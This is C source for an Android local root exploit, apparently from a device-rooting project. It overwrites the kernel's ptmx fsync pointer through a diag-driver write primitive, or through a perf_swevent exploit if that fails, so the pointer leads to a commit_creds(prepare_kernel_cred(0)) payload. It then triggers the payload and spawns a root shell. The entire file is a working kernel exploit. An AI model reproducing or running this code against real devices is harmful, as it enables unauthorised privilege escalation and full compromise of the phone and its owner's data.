#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "cred.h"
#include "mm.h"
#include "perf_swevent.h"
#include "ptmx.h"
#include "libdiagexploit/diag.h"

void
obtain_root_privilege(void)
{
  commit_creds(prepare_kernel_cred(0));
}

static bool
run_obtain_root_privilege(void *user_data)
{
  int fd;

  fd = open(PTMX_DEVICE, O_WRONLY);
  fsync(fd);
  close(fd);

  return true;
}

static bool
attempt_diag_exploit(unsigned long int address)
{
  struct diag_values injection_data;

  injection_data.address = address;
  injection_data.value = (uint16_t)&obtain_root_privilege;

  return diag_run_exploit(&injection_data, 1,
                          run_obtain_root_privilege, NULL);
}

static bool
run_exploit(void)
{
  unsigned long int ptmx_fsync_address;
  unsigned long int ptmx_fops_address;

  ptmx_fops_address = get_ptmx_fops_address();
  if (!ptmx_fops_address) {
    return false;
  }

  ptmx_fsync_address = ptmx_fops_address + 0x38;

  if (attempt_diag_exploit(ptmx_fsync_address)) {
    return true;
  }

  printf("\nAttempt perf_swevent exploit...\n");
  return perf_swevent_run_exploit(ptmx_fsync_address, (int)&obtain_root_privilege,
                                  run_obtain_root_privilege, NULL);
}

int
main(int argc, char **argv)
{
  set_kernel_phys_offset(0x200000);
  remap_pfn_range = get_remap_pfn_range_address();
  if (!remap_pfn_range) {
    printf("You need to manage to get remap_pfn_range addresses.\n");
    exit(EXIT_FAILURE);
  }

  if (!setup_creds_functions()) {
    printf("Failed to get prepare_kernel_cred and commit_creds addresses.\n");
    exit(EXIT_FAILURE);
  }

  run_exploit();

  if (getuid() != 0) {
    printf("Failed to obtain root privilege.\n");
    exit(EXIT_FAILURE);
  }

  system("/system/bin/sh");

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
